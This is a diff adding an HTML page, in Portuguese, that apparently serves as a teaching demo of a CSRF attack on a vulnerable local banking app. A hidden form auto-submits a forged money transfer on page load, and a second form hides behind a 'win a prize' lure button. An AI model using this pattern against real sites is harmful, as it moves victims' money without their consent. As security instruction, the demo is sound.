@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Site Malicioso - CSRF Demo</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
+        .danger { background: #dc3545; color: white; padding: 15px; border-radius: 5px; }
+        .info { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        code { background: #f8f9fa; padding: 2px 6px; border-radius: 3px; }
+        iframe { width: 100%; height: 80px; border: 1px solid #ddd; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Site Malicioso</h1>
+    <p class="danger">
+        <strong>ATENÇÃO:</strong> Esta página simula um ataque CSRF.
+        Ela força o navegador do usuário logado a transferir dinheiro
+        sem que ele perceba.
+    </p>
+
+    <div class="info">
+        <h3>Como funciona o ataque:</h3>
+        <ol>
+            <li>O usuário faz login na aplicação vulnerável (<code>http://localhost:8080</code>)</li>
+            <li>O usuário visita ESTE site malicioso (ou recebe um email com link)</li>
+            <li>Este site submete um formulário automaticamente para <code>/transferir</code></li>
+            <li>O navegador envia os cookies de sessão automaticamente</li>
+            <li>A transferência é executada sem consentimento do usuário!</li>
+        </ol>
+    </div>
+
+    <h2>Ataque Automático (Formulário Invisível)</h2>
+    <p>O formulário abaixo é submetido automaticamente via JavaScript assim que a página carrega:</p>
+
+    <form id="csrf-form" action="http://localhost:8080/transferir" method="POST" target="result-frame">
+        <input type="hidden" name="destino" value="conta-do-hacker"/>
+        <input type="hidden" name="valor" value="999.99"/>
+    </form>
+
+    <iframe id="result-frame" name="result-frame"></iframe>
+
+    <script>
+        // Submete o formulário automaticamente ao carregar a página
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+
+    <h2>Ataque Manual (Clique no botão)</h2>
+    <p>Se o ataque automático não funcionar (bloqueio de iframe), clique no botão:</p>
+    <form action="http://localhost:8080/transferir" method="POST">
+        <input type="hidden" name="destino" value="conta-do-hacker"/>
+        <input type="hidden" name="valor" value="999.99"/>
+        <button type="submit" style="background:#dc3545;color:white;padding:15px;border:none;cursor:pointer;">
+            Clique aqui para ganhar um prêmio!
+        </button>
+    </form>
+
+    <hr>
+    <p><small>Para testar: abra a aplicação em uma aba, faça login, depois abra este arquivo em outra aba.</small></p>
+</body>
+</html>
